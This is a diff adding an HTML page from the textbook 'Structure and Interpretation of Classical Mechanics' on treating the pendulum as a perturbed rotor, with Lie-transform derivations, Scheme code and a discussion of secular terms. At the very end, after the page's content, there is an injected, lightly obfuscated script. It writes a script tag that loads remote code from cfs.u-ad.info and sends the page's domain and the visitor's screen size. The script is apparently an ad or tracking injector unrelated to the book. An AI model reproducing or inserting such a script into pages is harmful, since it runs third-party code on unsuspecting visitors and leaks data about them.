@@ -1,0 +1,496 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-72.html">previous</a></span><span>, <a href="book-Z-H-74.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_6.2"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_6.2">6.2&nbsp;&nbsp;Pendulum as a Perturbed Rotor</a></h2>
+<p><a name="%_idx_2990"></a><a name="%_idx_2992"></a>
+The pendulum is a simple one-degree-of-freedom system, for which the
+solutions are known.  If we consider the pendulum as a free rotor with
+the added complication of gravity, then we can carry out a perturbation
+step as just described to see how well it approximates the known
+motion of the pendulum.  </p>
+<p>
+<a name="%_idx_2994"></a><a name="%_idx_2996"></a>The motion of a pendulum is described by the Hamiltonian
+<a name="EQUATION_6.10"></a></p>
+<div align=left><img src="chap6-Z-G-10.gif" border="0"></div>
+<p>
+with coordinate <img src="chap1-Z-G-D-19.gif" border="0"> and conjugate angular momentum <em>p</em>, where
+<img src="chap1-Z-G-D-21.gif" border="0">  =  <em>m</em><em>l</em><sup>2</sup> and <i>&szlig;</i>  =  <em>m</em><em>g</em><em>l</em>.  The parameter <img src="chap1-Z-G-D-12.gif" border="0"> allows us to
+scale the perturbation; it is 1 for the actual pendulum.
+We divide the Hamiltonian into the free-rotor Hamiltonian and the
+perturbation from gravity:
+<a name="EQUATION_6.11"></a></p>
+<div align=left><img src="chap6-Z-G-11.gif" border="0"></div>
+<p>
+where
+<a name="EQUATION_6.12"></a></p>
+<div align=left><img src="chap6-Z-G-12.gif" border="0"></div>
+<p>
+The Lie generator <em>W</em> satisfies condition&nbsp;(<a href="book-Z-H-72.html#EQUATION_6.7">6.7</a>):
+<a name="EQUATION_6.13"></a></p>
+<div align=left><img src="chap6-Z-G-13.gif" border="0"></div>
+<p>
+or
+<a name="EQUATION_6.14"></a></p>
+<div align=left><img src="chap6-Z-G-14.gif" border="0"></div>
+<p>
+So
+<a name="EQUATION_6.15"></a></p>
+<div align=left><img src="chap6-Z-G-15.gif" border="0"></div>
+<p>
+where the arbitrary integration constant is ignored.</p>
+<p>
+The transformed Hamiltonian is <em>H</em>'  =  <em>H</em><sub>0</sub>  +  <em>o</em>(<img src="chap1-Z-G-D-12.gif" border="0"><sup>2</sup>).  If we can
+ignore the <img src="chap1-Z-G-D-12.gif" border="0"><sup>2</sup> contributions, then the transformed
+Hamiltonian is simply
+<a name="EQUATION_6.16"></a></p>
+<div align=left><img src="chap6-Z-G-16.gif" border="0"></div>
+<p>
+with solutions
+<a name="EQUATION_6.17"></a></p>
+<div align=left><img src="chap6-Z-G-17.gif" border="0"></div>
+<p></p>
+<p>
+To connect these solutions to the solutions of the original problem, we
+use the Lie series
+<a name="EQUATION_6.18"></a></p>
+<div align=left><img src="chap6-Z-G-18.gif" border="0"></div>
+<p>
+Similarly,
+<a name="EQUATION_6.19"></a></p>
+<div align=left><img src="chap6-Z-G-19.gif" border="0"></div>
+<p>
+Note that if the Lie series is truncated it is not exactly a canonical
+transformation; only the infinite series is canonical.</p>
+<p>
+The initial values <img src="chap1-Z-G-D-19.gif" border="0">'<sub>0</sub> and <em>p</em>'<sub>0</sub> are determined from the
+initial values of <img src="chap1-Z-G-D-19.gif" border="0"> and <em>p</em> by the inverse Lie transformation:
+<a name="EQUATION_6.20"></a></p>
+<div align=left><img src="chap6-Z-G-20.gif" border="0"></div>
+<p>
+and
+<a name="EQUATION_6.21"></a></p>
+<div align=left><img src="chap6-Z-G-21.gif" border="0"></div>
+<p>
+Note that if we truncate the coordinate transformations after the
+first-order terms in <img src="chap1-Z-G-D-12.gif" border="0"> (or any finite order), then the inverse
+transformation is not exactly the inverse of the transformation.</p>
+<p>
+The approximate solution for given initial conditions (<em>t</em><sub>0</sub>, <img src="chap1-Z-G-D-19.gif" border="0"><sub>0</sub>,
+<em>p</em><sub>0</sub>) is obtained by finding the corresponding (<em>t</em><sub>0</sub>, <img src="chap1-Z-G-D-19.gif" border="0">'<sub>0</sub>,
+<em>p</em>'<sub>0</sub>) using the transformation&nbsp;(<a href="#EQUATION_6.20">6.20</a>)
+and (<a href="#EQUATION_6.21">6.21</a>).  Then the system is evolved
+using the solutions&nbsp;(<a href="#EQUATION_6.17">6.17</a>).  The phase-space
+coordinates of the evolved point are transformed back to the original
+variables using the
+transformation&nbsp;(<a href="#EQUATION_6.18">6.18</a>) and
+(<a href="#EQUATION_6.19">6.19</a>).</p>
+<p>
+We define the two parts of the pendulum Hamiltonian:
+</p>
+<p><tt>(define&nbsp;((H0&nbsp;alpha)&nbsp;state)<br>
+&nbsp;&nbsp;(let&nbsp;((p&nbsp;(momentum&nbsp;state)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(/&nbsp;(square&nbsp;p)&nbsp;(*&nbsp;2&nbsp;alpha))))<br>
+<br>
+(define&nbsp;((H1&nbsp;beta)&nbsp;state)<br>
+&nbsp;&nbsp;(let&nbsp;((theta&nbsp;(coordinate&nbsp;state)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(*&nbsp;-1&nbsp;beta&nbsp;(cos&nbsp;theta))))<br>
+</p>
+</tt>
+<p>The Hamiltonian for the pendulum can be expressed as a series
+expansion in the parameter <img src="chap1-Z-G-D-12.gif" border="0"> by
+</p>
+<p><tt>(define&nbsp;(H-pendulum-series&nbsp;alpha&nbsp;beta&nbsp;epsilon)<br>
+&nbsp;&nbsp;(series&nbsp;(H0&nbsp;alpha)&nbsp;(*&nbsp;epsilon&nbsp;(H1&nbsp;beta))))<br>
+</p>
+</tt>
+<p><a name="%_idx_2998"></a>where the <tt>series</tt> procedure is a constructor for a series whose
+first terms are given and all further terms are zero.
+The Lie generator that eliminates the order-<img src="chap1-Z-G-D-12.gif" border="0"> terms is
+</p>
+<p><tt>(define&nbsp;((W&nbsp;alpha&nbsp;beta)&nbsp;state)<br>
+&nbsp;&nbsp;(let&nbsp;((theta&nbsp;(coordinate&nbsp;state))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(p&nbsp;(momentum&nbsp;state)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(/&nbsp;(*&nbsp;-1&nbsp;alpha&nbsp;beta&nbsp;(sin&nbsp;theta))&nbsp;p)))<br>
+</p>
+</tt>
+<p>We check that <tt><em>W</em></tt> satisfies condition&nbsp;(<a href="book-Z-H-72.html#EQUATION_6.7">6.7</a>):
+</p>
+<p><tt>(print-expression<br>
+&nbsp;((+&nbsp;((Lie-derivative&nbsp;(W&nbsp;'alpha&nbsp;'beta))&nbsp;(H0&nbsp;'alpha))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(H1&nbsp;'beta))<br>
+&nbsp;&nbsp;(up&nbsp;'t&nbsp;'theta&nbsp;'p)))<br>
+<i>0</i><br>
+</p>
+</tt>
+<p>and that it has the desired effect on the Hamiltonian:
+</p>
+<p><tt>(show-expression&nbsp;<br>
+&nbsp;(series:sum<br>
+&nbsp;&nbsp;(((exp&nbsp;(*&nbsp;'epsilon&nbsp;(Lie-derivative&nbsp;(W&nbsp;'alpha&nbsp;'beta))))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(H-pendulum-series&nbsp;'alpha&nbsp;'beta&nbsp;'epsilon))<br>
+&nbsp;&nbsp;&nbsp;(up&nbsp;'t&nbsp;'theta&nbsp;'p))<br>
+&nbsp;&nbsp;2))<br>
+</p>
+</tt>
+<p></p>
+<hr>
+
+<p></p>
+<div align=left><img src="chap6-Z-G-22.gif" border="0"></div>
+<p></p>
+<hr>
+
+<p>
+Indeed, the order-<img src="chap1-Z-G-D-12.gif" border="0"> term has been removed and an 
+order-<img src="chap1-Z-G-D-12.gif" border="0"><sup>2</sup> term has been introduced.  </p>
+<p>
+Ignoring the <img src="chap1-Z-G-D-12.gif" border="0"><sup>2</sup> terms in the new Hamiltonian, the solution is
+</p>
+<p><tt>(define&nbsp;(((solution0&nbsp;alpha&nbsp;beta)&nbsp;t)&nbsp;state0)<br>
+&nbsp;&nbsp;(let&nbsp;((t0&nbsp;(time&nbsp;state0))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(theta0&nbsp;(coordinate&nbsp;state0))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(p0&nbsp;(momentum&nbsp;state0)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;t<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(+&nbsp;theta0&nbsp;(/&nbsp;(*&nbsp;(-&nbsp;t&nbsp;t0)&nbsp;p0)&nbsp;alpha))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p0)))<br>
+</p>
+</tt>
+<p>
+The transformation from primed to unprimed phase-space coordinates is,
+including terms up to <tt>order</tt>,
+</p>
+<p><tt>(define&nbsp;((C&nbsp;alpha&nbsp;beta&nbsp;epsilon&nbsp;order)&nbsp;state)<br>
+&nbsp;&nbsp;(series:sum<br>
+&nbsp;&nbsp;&nbsp;(((Lie-transform&nbsp;(W&nbsp;alpha&nbsp;beta)&nbsp;epsilon)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;identity)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;state)<br>
+&nbsp;&nbsp;&nbsp;order))<br>
+</p>
+</tt>
+<p>To second order in <img src="chap1-Z-G-D-12.gif" border="0"> the transformation generated by <tt>W</tt> is
+</p>
+<p><tt>(show-expression&nbsp;<br>
+&nbsp;&nbsp;((C&nbsp;'alpha&nbsp;'beta&nbsp;'epsilon&nbsp;2)&nbsp;(up&nbsp;'t&nbsp;'theta&nbsp;'p)))<br>
+</p>
+</tt>
+<p></p>
+<hr>
+
+<p></p>
+<div align=left><img src="chap6-Z-G-23.gif" border="0"></div>
+<p></p>
+<hr>
+
+<p>
+The inverse transformation is
+</p>
+<p><tt>(define&nbsp;(C-inv&nbsp;alpha&nbsp;beta&nbsp;epsilon&nbsp;order)<br>
+&nbsp;&nbsp;(C&nbsp;alpha&nbsp;beta&nbsp;(-&nbsp;epsilon)&nbsp;order))<br>
+</p>
+</tt>
+<p>
+With these components, the perturbative solution (equation
+<a href="#EQUATION_6.9">6.9</a>) is
+</p>
+<p><tt>(define&nbsp;(((solution&nbsp;epsilon&nbsp;order)&nbsp;alpha&nbsp;beta)&nbsp;delta-t)<br>
+&nbsp;&nbsp;(compose&nbsp;(C&nbsp;alpha&nbsp;beta&nbsp;epsilon&nbsp;order)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;((solution0&nbsp;alpha&nbsp;beta)&nbsp;delta-t)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(C-inv&nbsp;alpha&nbsp;beta&nbsp;epsilon&nbsp;order)))<br>
+</p>
+</tt>
+<p>The resulting procedure maps an initial state to the solution state
+advanced by <tt>delta-t</tt>.</p>
+<p>
+We can examine the behavior of the perturbative solution and compare
+it to the true behavior of the pendulum.  There are several
+considerations.  We have truncated the Lie series for the phase-space
+transformation.  Does the missing part matter?  If the missing part
+does not matter, how well does this perturbation step work?</p>
+<p>
+
+Figure&nbsp;<a href="book-Z-H-1000.html#FIGURE_6.1">6.1</a> shows that as we increase the
+number of terms in the Lie series for the phase-space coordinate
+transformation the result appears to converge.  The lone trajectory
+includes only terms of first order.  The others, including terms of
+second, third, and fourth order, are closely clustered.  On the left
+edge of the graph (at <img src="chap1-Z-G-D-19.gif" border="0"> =  <tt>-</tt> <img src="chap1-Z-G-D-15.gif" border="0">), the order of the solution
+increases from the top to the bottom of the graph.  In the middle (at
+<img src="chap1-Z-G-D-19.gif" border="0"> = 0), the fourth-order curve is between the second-order curve
+and the third-order curve.  In addition to the error in phase-space
+path, there is also an error in the period -- the higher-order orbits
+have longer periods than the first-order orbit.  The parameters are
+<img src="chap1-Z-G-D-21.gif" border="0"> = 1.0 and <i>&szlig;</i> = 0.1.  We have set <img src="chap1-Z-G-D-12.gif" border="0"> = 1.  Each
+trajectory was started at <img src="chap1-Z-G-D-19.gif" border="0"> = 0 with <em>p</em> = 0.7.  Notice that
+the initial point on the solution varies between trajectories.  This
+is because the transformation is not perfectly inverted by the
+truncated Lie series.
+</p>
+<p>
+<a name="FIGURE_6.1"></a></p>
+<div align=left><img src="chap6-Z-G-24.gif" border="0"></div>
+<p>
+<a name="FIGURE_6.2"></a></p>
+<div align=left><img src="chap6-Z-G-25.gif" border="0"></div>
+<p></p>
+<p>
+Figure&nbsp;<a href="#FIGURE_6.2">6.2</a> compares the perturbative solution
+(with terms up to fourth order) with the actual trajectory of the
+pendulum.  The initial points coincide, to the precision of the graph,
+because the terms to fourth order are sufficient.  The trajectories
+deviate both in the phase plane and in the period, but they are still
+quite close.</p>
+<p>
+
+The trajectories of figures&nbsp;<a href="book-Z-H-1000.html#FIGURE_6.1">6.1</a> and
+<a href="#FIGURE_6.2">6.2</a> are all for the same initial state.  As we
+vary the initial state we find that for trajectories in the
+circulation region, far from the separatrix, the perturbative solution
+does quite well.  However, if we get close to the separatrix or if we
+enter the oscillation region, the perturbative solution is nothing like
+the real solution, and it does not even seem to converge.
+Figure&nbsp;<a href="book-Z-H-1000.html#FIGURE_6.3">6.3</a> shows what happens when we try to use
+the perturbative solution inside the oscillation region.
+Each trajectory was started at <img src="chap1-Z-G-D-19.gif" border="0"> = 0 with <em>p</em> = 0.55.  The
+parameters are <img src="chap1-Z-G-D-21.gif" border="0"> = 1.0 and <i>&szlig;</i> = 0.1.</p>
+<p>
+<a name="%_idx_3000"></a>This failure of the perturbation solution should not be surprising.
+We assumed that the real motion was a distorted version of the motion
+of the free rotor.  But in the oscillation region the assumption is
+not true -- the pendulum is not rotating at all.  The perturbative
+solutions can be valid (if they work at all!) only in a region where
+the topology of the real orbits is the same as the topology of the
+perturbative solutions.</p>
+<p>
+<a name="FIGURE_6.3"></a></p>
+<div align=left><img src="chap6-Z-G-26.gif" border="0"></div>
+<p></p>
+<p>
+We can make a crude estimate of the range of validity of the perturbative
+solution by looking at the first correction term in the phase-space
+transformation&nbsp;(<a href="#EQUATION_6.18">6.18</a>).  The correction
+in <img src="chap1-Z-G-D-19.gif" border="0"> is proportional to <img src="chap1-Z-G-D-12.gif" border="0"> <img src="chap1-Z-G-D-21.gif" border="0"> <i>&szlig;</i> / (<em>p</em>')<sup>2</sup>.  This is
+not a small perturbation if 
+<a name="EQUATION_6.22"></a></p>
+<div align=left><img src="chap6-Z-G-27.gif" border="0"></div>
+<p>
+This sets the scale for the validity of the perturbative solution.</p>
+<p>
+<a name="FIGURE_6.4"></a></p>
+<div align=left><img src="chap6-Z-G-28.gif" border="0"></div>
+<p></p>
+<p>
+
+<a name="%_idx_3002"></a>We can compare this scale to the size of the oscillation region (see
+figure&nbsp;<a href="#FIGURE_6.4">6.4</a>).  We can obtain the width of
+the region of oscillation of the pendulum by considering the
+separatrix.  The value of the Hamiltonian on the separatrix is the
+same as the value at the unstable equilibrium: <em>H</em>(<em>t</em>, <img src="chap1-Z-G-D-19.gif" border="0">  =  <img src="chap1-Z-G-D-15.gif" border="0">,
+<em>p</em>  =  0)  =  <i>&szlig;</i> <img src="chap1-Z-G-D-12.gif" border="0">.  The separatrix has maximum momentum
+<em>p</em><sup>sep</sup> at <img src="chap1-Z-G-D-19.gif" border="0">  =  0:
+<a name="EQUATION_6.23"></a></p>
+<div align=left><img src="chap6-Z-G-29.gif" border="0"></div>
+<p>
+Solving for <em>p</em><sup>sep</sup>, the half-width of the
+region of oscillation, we find
+<a name="EQUATION_6.24"></a></p>
+<div align=left><img src="chap6-Z-G-30.gif" border="0"></div>
+<p>
+Comparing equations&nbsp;(<a href="#EQUATION_6.22">6.22</a>) and
+(<a href="#EQUATION_6.24">6.24</a>), we see that the requirement that the terms
+in the perturbation solution be small excludes a
+region of the phase space with the same scale as the region of
+oscillation of the pendulum.  </p>
+<p>
+
+What the perturbation theory is doing is deforming the phase-space
+coordinate system so that the problem looks like the free-rotor
+problem.  This deformation is sensible only in the circulating case.
+So, it is not surprising that the perturbation theory
+fails in the oscillation region.  What may be surprising is how well the
+perturbation theory works just outside the oscillation region.
+The range of <em>p</em> in which the perturbation theory
+is not valid scales in the same way as the width of the oscillation
+region.  This need not have been the case -- the perturbation theory
+could have failed over a wider range.</p>
+<p>
+</p>
+<p><a name="%_thm_6.1"></a>
+<b>Exercise 6.1.</b>&nbsp;&nbsp;<strong>Symplectic residual</strong><br>
+For the transformation 
+<tt>(C alpha beta epsilon order)</tt>,
+compute the residuals in the symplectic test for various orders of
+truncation of the Lie series.
+</p>
+
+<p></p>
+<p>
+</p>
+<a name="%_sec_6.2.1"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_6.2.1">6.2.1&nbsp;&nbsp;Higher Order</a></h3>
+<p><a name="%_idx_3004"></a><a name="%_idx_3006"></a></p>
+<p>
+We can improve the perturbative solution by carrying out additional
+perturbation steps.  The overall plan is the same as before.  We
+perform a Lie transformation with a new generator that eliminates the
+desired terms from the Hamiltonian.  </p>
+<p>
+After the first step the
+Hamiltonian is, to second order in <img src="chap1-Z-G-D-12.gif" border="0">,
+<a name="EQUATION_6.25"></a></p>
+<div align=left><img src="chap6-Z-G-31.gif" border="0"></div>
+<p></p>
+<p>
+Performing a Lie transformation with generator <em>W</em>' yields the
+Hamiltonian
+<a name="EQUATION_6.26"></a></p>
+<div align=left><img src="chap6-Z-G-32.gif" border="0"></div>
+<p>
+So the condition on <em>W</em>' that the second-order terms are eliminated is
+<a name="EQUATION_6.27"></a></p>
+<div align=left><img src="chap6-Z-G-33.gif" border="0"></div>
+<p>
+This is
+<a name="EQUATION_6.28"></a></p>
+<div align=left><img src="chap6-Z-G-34.gif" border="0"></div>
+<p>
+A generator that satisfies this condition is
+<a name="EQUATION_6.29"></a></p>
+<div align=left><img src="chap6-Z-G-35.gif" border="0"></div>
+<p>
+There are two contributions to this generator, one proportional to
+<img src="chap1-Z-G-D-19.gif" border="0">' and the other involving a trigonometric function of
+<img src="chap1-Z-G-D-19.gif" border="0">'.</p>
+<p>
+The phase-space coordinate transformation resulting from this Lie
+transform is found as before.  For given initial conditions, we first
+carry out the inverse transformation corresponding to <em>W</em>, then that for <em>W</em>',
+solve for the evolution of the system using <em>H</em><sub>0</sub>, then transform back
+using <em>W</em>' and then <em>W</em>.  The approximate solution is
+<a name="EQUATION_6.30"></a></p>
+<div align=left><img src="chap6-Z-G-36.gif" border="0"></div>
+<p>
+The solution obtained in this way is
+compared to the actual evolution of the pendulum in
+figure&nbsp;<a href="#FIGURE_6.5">6.5</a>.  Terms in all Lie series up to <img src="chap1-Z-G-D-12.gif" border="0"><sup>4</sup> are included.  The perturbative solution,
+including this second perturbative step, is much closer to the actual
+solution in the initial segment than the first-order perturbative
+solution (figure&nbsp;<a href="#FIGURE_6.2">6.2</a>).  
+The time interval spanned is 10.  
+Over longer times the second-order perturbative solution diverges dramatically from the actual
+solution, as
+shown in figure&nbsp;<a href="#FIGURE_6.6">6.6</a>. 
+These solutions begin at
+<img src="chap1-Z-G-D-19.gif" border="0"> = 0 with <em>p</em> = 0.7.
+The parameters are <img src="chap1-Z-G-D-21.gif" border="0"> = 1.0 and
+<i>&szlig;</i> = 0.1.  The time interval 
+spanned is 100.</p>
+<p>
+<a name="FIGURE_6.5"></a></p>
+<div align=left><img src="chap6-Z-G-37.gif" border="0"></div>
+<p>
+<a name="FIGURE_6.6"></a></p>
+<div align=left><img src="chap6-Z-G-38.gif" border="0"></div>
+<p></p>
+<p>
+
+A problem with the perturbative solution is that there are terms
+in <em>W</em>' and in the corresponding phase-space coordinate transformation
+that are proportional to <img src="chap1-Z-G-D-19.gif" border="0">', and <img src="chap1-Z-G-D-19.gif" border="0">' grows linearly with
+time.  So the solution can be valid only for small times; the interval
+of validity depends on the frequency of the particular trajectory
+under investigation and the size of the coefficients multiplying the
+various terms.  Such terms in a perturbative representation of the
+solution that are proportional to time are called <a name="%_idx_3008"></a><a name="%_idx_3010"></a><em>secular terms</em>.
+They limit the validity of the perturbation theory to small times.</p>
+<p>
+</p>
+<a name="%_sec_6.2.2"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_6.2.2">6.2.2&nbsp;&nbsp;Eliminating Secular Terms</a></h3>
+<p><a name="%_idx_3012"></a><a name="%_idx_3014"></a>
+A solution to the problem of secular terms was developed
+<a name="%_idx_3016"></a><a name="%_idx_3018"></a>by Lindstedt and Poincar&eacute;.  The goal of each perturbation step is to
+eliminate terms in the Hamiltonian that prevent solution.  However,
+the term in <em>H</em>' that led to the secular term in the generator <em>W</em>'
+does not actually impede solution.  So a better procedure is to
+leave that term in the Hamiltonian and find the generator <em>W</em>'' that
+eliminates only the term that is periodic in <img src="chap1-Z-G-D-19.gif" border="0">'.  
+So <em>W</em>'' must satisfy
+<a name="EQUATION_6.31"></a></p>
+<div align=left><img src="chap6-Z-G-39.gif" border="0"></div>
+<p>
+The generator is
+<a name="EQUATION_6.32"></a></p>
+<div align=left><img src="chap6-Z-G-40.gif" border="0"></div>
+<p>
+After we perform a Lie transformation with this generator, the new
+Hamiltonian is
+<a name="EQUATION_6.33"></a></p>
+<div align=left><img src="chap6-Z-G-41.gif" border="0"></div>
+<p>
+Including terms up to the <img src="chap1-Z-G-D-12.gif" border="0"><sup>2</sup> term, the solution is
+<a name="EQUATION_6.34"></a></p>
+<div align=left><img src="chap6-Z-G-42.gif" border="0"></div>
+<p></p>
+<p>
+We construct the solution for a given initial condition as before by
+
+composing the transformations, the solution of the modified
+Hamiltonian, and the inverse transformations.  
+The approximate solution is
+<a name="EQUATION_6.35"></a></p>
+<div align=left><img src="chap6-Z-G-43.gif" border="0"></div>
+<p>
+The resulting phase space
+evolution is shown in figure&nbsp;<a href="#FIGURE_6.7">6.7</a>.  Now the
+perturbative solution is a closed curve in the phase plane and is in
+pretty good agreement with the actual solution.  </p>
+<p>
+<a name="FIGURE_6.7"></a></p>
+<div align=left><img src="chap6-Z-G-44.gif" border="0"></div>
+<p></p>
+<p>
+By modifying the solvable part of the Hamiltonian we are modifying the
+frequency of the solution.  The secular terms appeared because we were
+trying to approximate a solution with one frequency as a Fourier
+series with the wrong frequency.  As an analogy, consider
+<a name="EQUATION_6.36"></a></p>
+<div align=left><img src="chap6-Z-G-45.gif" border="0"></div>
+<p>
+The periodic terms are multiplied by terms that are polynomials in the
+time.  These polynomials are the initial segment of the power series
+for periodic functions.  The infinite series are convergent, but if the
+series are truncated the error is large at large times.</p>
+<p>
+Continuing the perturbative solution to higher orders is now a
+straightforward repetition of the steps carried out so far.
+At each step in the perturbation solution there will be new
+contributions to the solvable part of the Hamiltonian that absorb
+potential secular terms.  The contribution is just the 
+angle-independent part of the Hamiltonian after the Hamiltonian is written as
+a Fourier series.  The constant part of the Fourier series is the
+same as the average of the Hamiltonian over the angle.  So at each
+step in the perturbation theory, the average of the perturbation is
+included with the solvable part of the Hamiltonian and the periodic
+part is eliminated by a Lie transformation.</p>
+<p>
+
+</p>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-72.html">previous</a></span><span>, <a href="book-Z-H-74.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD3XzEOghtRoBhL56MU7dch6jv1Vojv6haAVMIHP0U%2bi7ZB9bsPy3MkDoP9%2b8etkh9XB34rPxSz4Fe0%2fQbDhJJeiTXyC5cLqI8Zpzd%2b9P8pDLNdkU1nJwDrTIWhG%2bx6PWvizbthDI5pMBsIrKmDP6EReIWUsaWv1V0udwVlC73zGpYtCKrcsYe92X8zzqsKbOlOzmzVHwpUbiC5%2booC5tWYovAb2rwvm%2brlsV78AGTkg6rx6CXTjeOIGX%2f9wZodTsulnVd70y%2bkOjUC%2fB3KfRnt%2fTznQrax6gu6QMV6t8MbUHm818h5AK0hOcRgFrBRvxqhfX68mI7Gv4vLLqc8c%2fMKN%2bw0VBSisoC6XVK0e%2bjp6N7RplXyEPuuy1L0bpVKV6zqOmQHvrF%2bBkJQXQ9tuLJ5X6NWt1pBklnuq7MlWefHKdrWXk4%2bkWask32HGCMHg77EdCJfhY5T15VnVaI%2fCoINc");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
